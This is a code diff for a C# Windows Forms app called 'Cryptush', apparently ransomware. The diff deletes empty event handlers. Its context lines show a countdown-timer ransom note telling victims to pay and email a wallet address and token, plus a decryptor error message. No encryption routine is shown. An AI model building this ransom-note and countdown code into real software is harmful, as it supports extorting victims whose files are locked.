@@ -23,16 +23,6 @@ namespace Cryptush
             emailText.Text = $"Once paid, send your wallet address and the following token to {Cryptush.Email}:";
         }
 
-        private void label1_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void label3_Click(object sender, EventArgs e)
-        {
-
-        }
-
         private void timer1_Tick(object sender, EventArgs e)
         {
             mcounter--;
@@ -44,26 +34,12 @@ namespace Cryptush
             MinutesLBL.Text = mcounter.ToString();
         }
 
-        private void stimer_Tick(object sender, EventArgs e)
-        {
-        }
-
         private void htimer_Tick(object sender, EventArgs e)
         {
             hcounter--;
             if (hcounter == 0)
                 HoursTimer.Stop();
             HoursLBL.Text = hcounter.ToString();
-        }
-
-        private void lblCountDown_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void label6_Click(object sender, EventArgs e)
-        {
-
         }
 
         private void secondsTimer_Tick(object sender, EventArgs e)
@@ -103,11 +79,6 @@ namespace Cryptush
                 }
                 else { MessageBox.Show("No Cryptush files were found", "Cryptush Error", button, MessageBoxIcon.Error);  }
             }            
-        }
-
-        private void walletText_Click(object sender, EventArgs e)
-        {
-
         }
     }
 }
